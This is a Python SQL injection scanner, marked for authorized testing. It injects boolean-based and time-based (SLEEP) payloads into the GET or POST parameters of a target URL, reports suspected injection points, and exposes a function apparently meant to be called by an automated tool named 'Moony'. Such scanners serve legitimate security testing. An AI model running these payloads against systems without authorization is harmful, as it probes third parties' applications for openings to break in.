#!/usr/bin/env python3
# SQL Injection Detection Framework
# Authorized Security Testing Only

import requests
import time
import argparse
import json
from urllib.parse import urlparse, parse_qs, urlencode


class SQLiDetector:
    def __init__(self, delay=1.0, headers=None, cookies=None):
        self.session = requests.Session()
        self.delay = delay
        self.session.headers.update(headers or {"User-Agent": "Security-Testing-Tool/1.0"})
        if cookies:
            self.session.cookies.update(cookies)

        self.boolean_payloads = ["' AND 1=1 --", "' AND 1=2 --"]
        self.time_payloads = ["' AND SLEEP(5) --"]
        self.error_indicators = [
            "sql syntax", "mysql_fetch", "warning: mysql",
            "unclosed quotation", "odbc sql server driver"
        ]

    def baseline_request(self, url, method="GET", data=None):
        if method.upper() == "POST":
            resp = self.session.post(url, data=data, timeout=10)
        else:
            resp = self.session.get(url, timeout=10)
        return len(resp.text)

    def normalize_url(self, url):
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        return url

    def test_get_parameters(self, url):
        url = self.normalize_url(url)
        print(f"[*] Testing GET parameters: {url}")
        findings = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            print("[!] No GET parameters found.")
            return findings

        baseline_length = self.baseline_request(url)
        for param in params:
            for payload in self.boolean_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                try:
                    resp = self.session.get(test_url, timeout=10)
                    content = resp.text.lower()

                    if any(err in content for err in self.error_indicators):
                        findings.append({
                            "type": "Error-Based SQLi",
                            "parameter": param,
                            "payload": payload,
                            "url": test_url
                        })
                        print(f"[!] Possible Error-Based SQLi in {param}")

                    if abs(len(resp.text) - baseline_length) > 50:
                        findings.append({
                            "type": "Boolean-Based SQLi",
                            "parameter": param,
                            "payload": payload,
                            "url": test_url
                        })
                        print(f"[!] Possible Boolean-Based SQLi in {param}")

                    time.sleep(self.delay)
                except Exception:
                    continue

            for payload in self.time_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                try:
                    start = time.time()
                    self.session.get(test_url, timeout=10)
                    elapsed = time.time() - start

                    if elapsed > 5:
                        findings.append({
                            "type": "Time-Based SQLi",
                            "parameter": param,
                            "payload": payload,
                            "delay": elapsed,
                            "url": test_url
                        })
                        print(f"[!] Possible Time-Based SQLi in {param}")

                    time.sleep(self.delay)
                except Exception:
                    continue

        return findings

    def test_post_parameters(self, url, post_data):
        url = self.normalize_url(url)
        print(f"[*] Testing POST parameters: {url}")
        findings = []

        if not post_data:
            print("[!] No POST data provided.")
            return findings

        baseline_length = self.baseline_request(url, method="POST", data=post_data)

        for param in post_data:
            for payload in self.boolean_payloads:
                test_data = post_data.copy()
                test_data[param] = payload

                try:
                    resp = self.session.post(url, data=test_data, timeout=10)
                    content = resp.text.lower()

                    if any(err in content for err in self.error_indicators):
                        findings.append({
                            "type": "Error-Based SQLi",
                            "parameter": param,
                            "payload": payload,
                            "url": url,
                            "method": "POST"
                        })
                        print(f"[!] Possible Error-Based SQLi in POST {param}")

                    if abs(len(resp.text) - baseline_length) > 50:
                        findings.append({
                            "type": "Boolean-Based SQLi",
                            "parameter": param,
                            "payload": payload,
                            "url": url,
                            "method": "POST"
                        })
                        print(f"[!] Possible Boolean-Based SQLi in POST {param}")

                    time.sleep(self.delay)
                except Exception:
                    continue

            for payload in self.time_payloads:
                test_data = post_data.copy()
                test_data[param] = payload
                try:
                    start = time.time()
                    self.session.post(url, data=test_data, timeout=10)
                    elapsed = time.time() - start

                    if elapsed > 5:
                        findings.append({
                            "type": "Time-Based SQLi",
                            "parameter": param,
                            "payload": payload,
                            "delay": elapsed,
                            "url": url,
                            "method": "POST"
                        })
                        print(f"[!] Possible Time-Based SQLi in POST {param}")

                    time.sleep(self.delay)
                except Exception:
                    continue

        return findings


# --------------------------
# Callable function for Moony
# --------------------------
def detect_sqli(target_url, delay=1.0, post_data=None, headers=None, cookies=None):
    detector = SQLiDetector(delay=delay, headers=headers, cookies=cookies)

    if post_data:
        results = detector.test_post_parameters(target_url, post_data)
    else:
        results = detector.test_get_parameters(target_url)

    return {
        "target": target_url,
        "findings": results,
        "total_findings": len(results)
    }


# --------------------------
# CLI mode
# --------------------------
def main():
    parser = argparse.ArgumentParser(description="SQL Injection Detection Framework")
    parser.add_argument("target", help="Target URL with parameters")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests")
    parser.add_argument("--post", type=str, help="POST data as JSON string")

    args = parser.parse_args()
    print("\n[+] SQL Injection Detection Framework")
    print("[!] Use only on systems you have permission to test.\n")

    post_data = json.loads(args.post) if args.post else None
    result = detect_sqli(args.target, delay=args.delay, post_data=post_data)

    filename = f"sqli_detection_{int(time.time())}.json"
    with open(filename, "w") as f:
        json.dump(result, f, indent=2)

    print(f"\n[+] Scan complete.")
    print(f"[+] Findings: {len(result['findings'])}")
    print(f"[+] Results saved to: {filename}")


if __name__ == "__main__":
    main()
